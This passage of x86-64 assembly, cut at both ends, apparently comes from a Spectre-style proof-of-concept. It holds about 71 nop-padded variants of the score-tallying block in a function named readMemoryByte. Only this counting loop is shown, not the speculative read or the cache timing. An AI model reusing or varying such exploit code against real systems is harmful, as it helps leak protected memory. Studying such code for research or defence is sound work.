	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win3_continue
## Variant 3
.LreadMemoryByte_win3_var3:
	popq	%rax
	cmpl	%ecx, %eax
	nop
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 4
.LreadMemoryByte_win3_var4:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	nop
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 5
.LreadMemoryByte_win3_var5:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	nop
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 6
.LreadMemoryByte_win3_var6:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 7
.LreadMemoryByte_win3_var7:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 8
.LreadMemoryByte_win3_var8:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	nop
	addl	$1, %edx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 9
.LreadMemoryByte_win3_var9:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
	nop
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 10
.LreadMemoryByte_win3_var10:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	nop
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 11
.LreadMemoryByte_win3_var11:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	nop
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 12
.LreadMemoryByte_win3_var12:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	nop
	nop
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 13
.LreadMemoryByte_win3_var13:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	nop
	jmp	.LreadMemoryByte_win3_continue
## Variant 14
.LreadMemoryByte_win3_var14:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	nop
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 15
.LreadMemoryByte_win3_var15:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	nop
	nop
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 16
.LreadMemoryByte_win3_var16:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	nop
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	nop
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 17
.LreadMemoryByte_win3_var17:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 18
.LreadMemoryByte_win3_var18:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	nop
	nop
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 19
.LreadMemoryByte_win3_var19:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win3_continue
## Variant 20
.LreadMemoryByte_win3_var20:
	popq	%rax
	cmpl	%ecx, %eax
	nop
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 21
.LreadMemoryByte_win3_var21:
	popq	%rax
	cmpl	%ecx, %eax
	nop
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 22
.LreadMemoryByte_win3_var22:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	nop
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 23
.LreadMemoryByte_win3_var23:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	(%rax,%rcx,4), %edx
	nop
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 24
.LreadMemoryByte_win3_var24:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 25
.LreadMemoryByte_win3_var25:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
	nop
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 26
.LreadMemoryByte_win3_var26:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	nop
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 27
.LreadMemoryByte_win3_var27:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 28
.LreadMemoryByte_win3_var28:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	nop
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 29
.LreadMemoryByte_win3_var29:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	movslq	-68(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 30
.LreadMemoryByte_win3_var30:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
	nop
	nop
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win3_continue
## Variant 31
.LreadMemoryByte_win3_var31:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win3_continue
## Variant 32
.LreadMemoryByte_win3_var32:
	popq	%rax
	cmpl	%ecx, %eax
	nop
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 33
.LreadMemoryByte_win3_var33:
	popq	%rax
	cmpl	%ecx, %eax
	nop
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	nop
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 34
.LreadMemoryByte_win3_var34:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	nop
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 35
.LreadMemoryByte_win3_var35:
	popq	%rax
	cmpl	%ecx, %eax
	nop
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 36
.LreadMemoryByte_win3_var36:
	popq	%rax
	cmpl	%ecx, %eax
	nop
	nop
	nop
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 37
.LreadMemoryByte_win3_var37:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	nop
	movl	(%rax,%rcx,4), %edx
	nop
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 38
.LreadMemoryByte_win3_var38:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win3_continue
## Variant 39
.LreadMemoryByte_win3_var39:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	(%rax,%rcx,4), %edx
	nop
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 40
.LreadMemoryByte_win3_var40:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	nop
	jmp	.LreadMemoryByte_win3_continue
## Variant 41
.LreadMemoryByte_win3_var41:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	nop
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	nop
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 42
.LreadMemoryByte_win3_var42:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win3_continue
## Variant 43
.LreadMemoryByte_win3_var43:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	nop
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	nop
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 44
.LreadMemoryByte_win3_var44:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win3_continue
## Variant 45
.LreadMemoryByte_win3_var45:
	popq	%rax
	cmpl	%ecx, %eax
	nop
	nop
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 46
.LreadMemoryByte_win3_var46:
	popq	%rax
	cmpl	%ecx, %eax
	nop
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	nop
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 47
.LreadMemoryByte_win3_var47:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	(%rax,%rcx,4), %edx
	nop
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 48
.LreadMemoryByte_win3_var48:
	popq	%rax
	nop
	nop
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win3_continue
## Variant 49
.LreadMemoryByte_win3_var49:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	nop
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 50
.LreadMemoryByte_win3_var50:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win3_continue
## Variant 51
.LreadMemoryByte_win3_var51:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 52
.LreadMemoryByte_win3_var52:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	nop
	nop
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 53
.LreadMemoryByte_win3_var53:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	nop
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 54
.LreadMemoryByte_win3_var54:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win3_continue
## Variant 55
.LreadMemoryByte_win3_var55:
	popq	%rax
	cmpl	%ecx, %eax
	nop
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 56
.LreadMemoryByte_win3_var56:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	nop
	nop
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 57
.LreadMemoryByte_win3_var57:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 58
.LreadMemoryByte_win3_var58:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	nop
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 59
.LreadMemoryByte_win3_var59:
	popq	%rax
	cmpl	%ecx, %eax
	nop
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 60
.LreadMemoryByte_win3_var60:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	nop
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 61
.LreadMemoryByte_win3_var61:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	nop
	jmp	.LreadMemoryByte_win3_continue
## Variant 62
.LreadMemoryByte_win3_var62:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
	nop
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 63
.LreadMemoryByte_win3_var63:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	je	LBB1_23
	nop
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 64
.LreadMemoryByte_win3_var64:
	popq	%rax
	cmpl	%ecx, %eax
	nop
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 65
.LreadMemoryByte_win3_var65:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
	nop
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 66
.LreadMemoryByte_win3_var66:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
	nop
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 67
.LreadMemoryByte_win3_var67:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 68
.LreadMemoryByte_win3_var68:
	popq	%rax
	cmpl	%ecx, %eax
	nop
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 69
.LreadMemoryByte_win3_var69:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 70
.LreadMemoryByte_win3_var70:
	popq	%rax
	cmpl	%ecx, %eax
	nop
	nop
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 71
.LreadMemoryByte_win3_var71:
	popq	%rax
	cmpl	%ecx, %eax
	nop
	nop
	nop
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
